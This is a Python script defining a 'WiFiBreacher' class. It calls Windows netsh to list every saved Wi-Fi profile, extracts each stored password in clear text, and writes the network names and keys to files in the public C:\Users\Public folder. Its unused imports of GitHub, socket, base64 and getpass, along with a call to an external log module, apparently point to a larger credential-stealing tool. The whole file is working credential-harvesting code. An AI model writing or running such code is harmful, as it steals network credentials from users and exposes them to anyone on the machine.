import subprocess
import re
import os
import socket
import platform
import base64
import getpass
import datetime
from github import Github
import datetime
from LogCreator import create_file

class WiFiBreacher():
    def __init__(self, script_name):
        self.script_name = script_name
        
    def run(self):
        '''This function will try to recover saved WiFi passwords and send its output to C: Users Public wifi_data'''
        wifi_path = "C:\\Users\\Public\\wiFi_output"
        if not os.path.exists(wifi_path):
            os.makedirs(wifi_path)

        command_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
        profile_names = re.findall(r':\s(.*)\r', command_output)
        wifi_passwords = []
        for name in profile_names:
            password_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8')
            password = re.search(r'Key Content\s*: (.*)\r', password_output)
            if password:
                wifi_passwords.append((name, password.group(1)))

        if wifi_passwords:
            for name, password in wifi_passwords:
                file_path = os.path.join(wifi_path, f"{name}_password.txt")
                with open(file_path, 'w') as file:
                    file.write(f"Network Name: {name}\n")
                    file.write(f"Password: {password}\n")
        else:
            pass

wifi_breacher = WiFiBreacher("WiFiBreacher")
wifi_breacher.run()
create_file()